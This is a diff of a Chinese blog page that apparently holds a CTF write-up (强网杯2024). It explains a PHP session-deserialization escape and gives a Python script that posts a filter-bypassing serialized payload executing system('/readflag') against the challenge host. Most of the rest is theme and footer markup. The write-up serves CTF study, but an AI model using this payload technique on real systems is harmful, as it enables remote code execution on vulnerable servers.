+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;&quot;</span>;session_key|s:<span class="hljs-number">25</span>:<span class="hljs-string">&quot;uz6IWN70l641vlzLjeixuI8CT&quot;</span>;password|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:10:&quot;</span>phpinfo();<span class="hljs-string">&quot;;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/image-20241103163347648.png" alt="image-20241103163347648"></p>
+<p><img src="/img/qwb2024/image-20241103163347648.png" srcset="/img/loading.gif" lazyload alt="image-20241103163347648"></p>
 <p>如果我能让蓝色部分全部被算在user里，后面剩下的部分我就可控，可以反序列化，只需要在payload前面加;xx|</p>
 <p><code>;</code>是分隔前面的数据，xx是键名随便，<code>|</code>是必要格式。</p>
 <p>现在我的数据就变成了：</p>
-<p><img src="/img/qwb2024/image-20241103163738734.png" alt="image-20241103163738734"></p>
+<p><img src="/img/qwb2024/image-20241103163738734.png" srcset="/img/loading.gif" lazyload alt="image-20241103163738734"></p>
 <p>session_key是随机的，我只需要多发几次包让key的长度与其他脏数据加起来等于56即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeikei7c3gbjdb3tab6.cloudeci1.ichunqiu.com&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;;xx|O:15:\&quot;notouchitsclass\&quot;:1:&#123;s:4:\&quot;data\&quot;;s:20:\&quot;syssystemtem(&#x27;/readflag&#x27;);\&quot;;&#125;&quot;</span></span><br><span class="line">&#125;         <span class="comment">#注意双写</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.post(url+<span class="string">&quot;/index.php&quot;</span>,data=data,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/qwb2024/image-20241103164639960.png" alt="image-20241103164639960"></p>
-	
-		</div>
-		
-		<div id="current-post-cover" data-scr="/img/qwb2024/qwb2024.png"></div>
-
-		<!-- relate post, comment...-->
-		<div class="investment-container">
-			<div class="investment-header">
-				<div class="investment-title-1">
-					<div class="on">相关文章</div>
-					<div>评论</div>
-					<div>分享</div>
-				</div>
-				<div class="investment-title-2">	            
-					
-	<span>
-		<a id="totop-post-page">返回顶部</a>
-		
-			<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp" rel="prev">
-				&laquo;上一篇
-			</a>
-		
-		
-			<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender" rel="next">
-				下一篇&raquo;
-			</a>
-			
-	</span>
-
-
-      		
-				</div>	
-			</div>
-			
-			<div class="investment-content">
-				<div class="investment-content-list">
-					
-
-<div class="relate-post">
-	
-		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">
-								第八届西湖论剑初赛web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 18日, 2025				
-							</p>
-							<p class="relate-post-content">
-								Rank-l
-可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302
-过滤了空格，用request.args.aaa可以参数逃逸。
-1phone_number=&#123;&#123;url_for.__global...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/xhlj8/XHLJ8.png" alt="第八届西湖论剑初赛web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
-								SUCTF 2025 WEB部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 14日, 2025				
-							</p>
-							<p class="relate-post-content">
-								SU_photogallery
-尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
-								2024鹏城杯web全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 9日, 2024				
-							</p>
-							<p class="relate-post-content">
-								python口算-pcb2024123456789101112131415161718192021222324import requestsimport reurl = &quot;http://192.168.18.28&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/5.jpg" alt="2024鹏城杯web全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">
-								ByteCTF2024大师赛web部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 21日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezobj源码：
-12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);include_once(&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024bytectf/bytectf.png" alt="ByteCTF2024大师赛web部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
-								第四届长城杯web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 8日, 2024				
-							</p>
-							<p class="relate-post-content">
-								WEB
-SQLUS
-
-
-
-猜测账户是admin密码是任意一个字符
-登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
-
-
-
-在头像前端看到了上传路径
-
-
-flag没有权...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
-								NepCTF2024部分web			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
-12if os.path.islink(new_file):    return &...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
-								2024第七届巅峰极客部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
-								2024春秋杯部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								七月 6日, 2024				
-							</p>
-							<p class="relate-post-content">
-								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
-
-一眼ssti模版注入，
-1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
-								PolarCTF2024夏季个人挑战赛全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 10日, 2024				
-							</p>
-							<p class="relate-post-content">
-								扫扫看不用扫，猜测是flag.php
-
-
-flag{094c9cc14068a7d18ccd0dd3606e532f}
-
-debudaoflag在cookie里：
-
-
-flag{72077a55w312584wb1aaa88888cd...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-		</ul>
-	
-</div>	
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-comment">
-
-	
-
-		
-
-			<!-- gitalk comment -->
-			<!-- show gitalk comment -->
-<div id="gitalk-container"></div>
-
-<!-- gitalk`s css & js -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<link rel="stylesheet" href="/css/comment.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-	(function gitalkComment(){
-		//Thanks O-R
-		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
-		//去除尾部匹配正则数组的字符串  
-		//Remove redundant characters
-		String.prototype.trimEnd = function(regStr) {
-			let result = this;
-			if(regStr == undefined || regStr == null || regStr == "") {
-				return result;
-			}
-			let array = regStr.split(',');
-
-			if(array.length > 0) {
-
-				let c = array.shift(), 
-					str = this,
-					i = str.length,
-					rg = new RegExp(c),
-					matchArr = str.match(rg);
-
-				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
-					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
-						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
-						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
-						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
-						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
-						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
-						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
-						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
-					matchStr = matchStr + '$';
-					result = str.replace(new RegExp(matchStr), "");
-				}
-
-				if(array.length > 0) {
-					return result.trimEnd(array.join())
-				} else {
-					return result;
-				}
-			}
-		};
-
-		//Create gitalk
-		let gitalk = new Gitalk({
-			clientID: '333--',
-			clientSecret: '333--',
-			//id: window.location.pathname,
-			//id: decodeURI(window.location.pathname),
-			//id: (window.location.pathname).split("/").pop().substring(0, 49),
-			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
-			repo: 'annie-gitalk',
-			owner: 'Sariay',
-			admin: 'Sariay',
-			distractionFreeMode: 'true',
-		})
-		gitalk.render('gitalk-container');		
-	})();
-</script>
-
-		
-		
-	
-
-</div>
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-share">
-	
-	
-
-		
-			
-			<!-- socialShare share -->
-			<div class="social-share"></div>
-
-<!--  css & js -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-			
-		
-		
-	
-</div>
-
-
-				</div>
-			</div>	
-		</div>
-	</div>
-</div>
-
-<!-- show math formula -->
-
-
-
-	 
-	
-<script src="/plugin/clipboard/clipboard.js"></script>
-
-	<script>
-		// Copy code !
-	    function preprocessing() {
-	        $("#article-content .highlight").each(function() {
-	            $(this).wrap('<div id="post-code"></div>');
-	        })
-
-	        $("#article-content #post-code").each(function() {
-	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
-	        })
-
-	        $("#article-content .copy-nav").each(function() {
-	            let languageClass = $(this).next().attr('class'),
-	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
-
-	            $(this).find('.code-language').text(language);
-	            $(this).append('<span class="copy-btn icon-paste"></span>');
-	        });
-	    }
-
-		function copy() {
-		    $('#article-content #post-code').each(function(i) {
-		        let codeCopyId = 'codeCopy-' + i;
-
-		        let codeNode = $(this).find('.code'),
-		            copyButton = $(this).find('.copy-btn');
-
-		        codeNode.attr('id', codeCopyId);
-		        copyButton.attr('data-clipboard-target-id', codeCopyId);
-		    })
-   
-			let clipboard = new ClipboardJS('.copy-btn', {
-					target: function(trigger) {
-						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
-					}
-		      	});
-
-			//pure js
-			function showTooltip(elem, msg) {		   
-				elem.setAttribute('aria-label', msg);
-				elem.setAttribute('class', 'copy-btn icon-clipboard1');
-				setTimeout(function() {
-					elem.setAttribute('class', 'copy-btn icon-paste');
-				}, 2000);
-			}
-
-			clipboard.on('success', function(e) {
-			    e.clearSelection();
-			    console.info('Action:', e.action);		   
-			    console.info('Trigger:', e.trigger);
-			    showTooltip(e.trigger, 'Copied!');   
-			});
-			
-			clipboard.on('error', function(e) {
-			    console.error('Action:', e.action);
-			    console.error('Trigger:', e.trigger);
-			});
-		}
-		
-		(function copyCode(){
-			if ($('.layout-post').length) {
-			    preprocessing();
-			    copy();
-			} 
-		})();
-	</script>
-
-
-
-
-
-
-<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
-
-
-<script src="/plugin/fancybox/jquery.fancybox.js"></script>
-
-
-<script type="text/javascript">
-	(function gallerySet(){
-		let titleID = $('.article-title a'),
-			imageID = $('.article-content img'),
-			videoID = $('.article-content video');
-		
-		let postTitle = titleID.text() ? titleID.text() : "No post title!";
-		
-		imageID.each(function() {
-			let imgPath = $(this).attr('src'),
-				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
-		});
-		
-		videoID.each(function() {
-			let videoPath = $(this).attr('src');
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
-		});
-		
-		//TODO：支持html5 video
-
-		if($('#layout-post').length) {
-			$('[data-fancybox="gallery"]').fancybox({
-				loop: true,
-				buttons: [
-					"zoom",
-					"share",
-					"slideShow",
-					"fullScreen",
-					//"download",
-					"thumbs",
-					"close"
-				],
-				protect: true
-			});
-		}
-	})();
-</script>
-		</main>
-
-		<!--footer-->
-		<footer>
-	<div id="navigation-show">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-
-	<div class="copyright">
-		<p>
-			 
-				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
-			
-			
-				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
-			
-		</p>
-		<p>
-			
-
-	<!-- busuanzi -->
-	<!-- busuanzi -->
-
-		
-	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-
-		<span id="busuanzi_container_page_pv">
-	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-		</span>
-
-	
-
-
-
-
-			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
-			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
-		</p>
-	</div>		
-</footer>
-		
-	<!-- Local or hitokoto! -->
-
-	
-<script src="/plugin/motto/motto.js"></script>
-
-	
-	<script type="text/javascript">
-		(function motto(){
-			let mottoText = getMingYanContent().split('</br> - </br>'),
-			
-			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
-			
-			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
-			
-			mottoTextContent = mottoTextContent.trim().substring(0, 100);
-		
-			$("#motto-content").html( mottoTextContent);
-			$("#motto-author").html( mottoTextFrom  );
-		})();	
-	</script>	
-
-
-
-<!-- love effect -->
-
-	
-<script src="/plugin/love/love.js"></script>
-
-
-
-<!-- back to top -->
-
-	<div id="totop">
-	<span class="icon-circle-up"></span>
-</div>
-
-
-
-<!-- site analysis -->
-
-
-	<!-- site-analysis -->
-	
-	
-	
-	
-	
- 
-
-<!-- leancloud -->
-
-
-	<!-- leancloud -->
-	<!--
-	时间：2018-11-27
-	描述：
-		文章访问量：visitors
-		文章喜欢量：likes	
-		文章排行榜：topNPost
-		其他得说明：
-			01-Cookie相关的函数 
-				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
-			02-visitors相关的函数 
-				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
-				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
-			03-topNPost相关的函数
-				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
-			04-likes相关的函数，
-				参考了01 & 02进行简单的设计与实现
--->
-
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://eci-2zeikei7c3gbjdb3tab6.cloudeci1.ichunqiu.com&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;;xx|O:15:\&quot;notouchitsclass\&quot;:1:&#123;s:4:\&quot;data\&quot;;s:20:\&quot;syssystemtem(&#x27;/readflag&#x27;);\&quot;;&#125;&quot;</span><br>&#125;         <span class="hljs-comment">#注意双写</span><br>cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data,cookies=cookies)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/qwb2024/image-20241103164639960.png" srcset="/img/loading.gif" lazyload alt="image-20241103164639960"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
   
-<script src="/plugin/leancloud/av-min.js"></script>
-<script src="/js/leancloud-count.js"></script>
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
+      
+    </div>
+  
+</div>
 
 
-	
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>强网杯2024</div>
+      <div>http://example.com/2024/11/03/强网杯2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024鹏城杯web全wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
+                        <span class="hidden-mobile">SCTF2024 ezRender</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
 
   
 
 
 
-<script src="/plugin/chinese/chinese.js"></script>
-<script src="/plugin/imagelazyloader/yall.min.js"></script>
-<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
-<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
-<script src="/plugin/resizediv/resizediv.js"></script>
-<script src="/js/main.js"></script>
+  
 
-	</body>	
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
